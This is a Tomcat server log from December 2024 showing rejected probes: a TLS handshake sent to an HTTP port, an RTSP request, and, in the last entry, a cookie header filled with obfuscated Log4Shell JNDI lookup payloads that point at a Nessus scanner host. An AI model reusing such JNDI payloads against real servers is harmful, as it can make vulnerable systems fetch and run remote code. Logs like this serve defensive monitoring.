12-Dec-2024 03:02:22.334 INFO [http-nio-45854-exec-8] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xc20x010x000x000xbe0x030x010x1dr[0xde0x1a0xb00x12s0xc50xca0x9f0xb20x1c0x080xb60x890xccD0xa210xa80xb1*b0xf60xb5Z0x1410xb20xc50xa80x000x00R0xc00x0a0xc00x140x0090x0080x000x880x000x870xc00x190x00:0x000x890xc00x090xc00x130x0030x0020x000x9a0x000x990x00E0x00D0xc00x180x0040x000x9b0x00F0xc00x070xc00x110xc00x160x000x180xc00x080xc00x120x000x160x000x130xc00x170x000x1b0x0050x000x840x00/0x000x960x00A0x000x070x000x050x000x040x000x0a0x000xff0x010x000x00C0x000x000x000x1b0x000x190x000x000x16silo.luddy.indiana.edu0x000x0b0x000x040x030x000x010x020x000x0a0x000x0c0x000x0a0x000x1d0x000x170x000x1e0x000x190x000x180x00#0x000x000x000x160x000x000x000x170x000x00...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:419)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
12-Dec-2024 17:39:51.209 INFO [http-nio-45854-exec-3] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [RTSP/1.00x0d0x0a0x0d0x0a...]
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:570)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
12-Dec-2024 19:50:01.432 INFO [http-nio-45854-exec-10] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [{jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus};JSESSIONID=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus};SESSIONID=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus};PHPSESSID=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus};token=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus};session=${jndi:ldap://log4shell-generic-43jfGLnI0bdRJRXsca4B${lower:ten}.w.nessus.org/nessus}] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
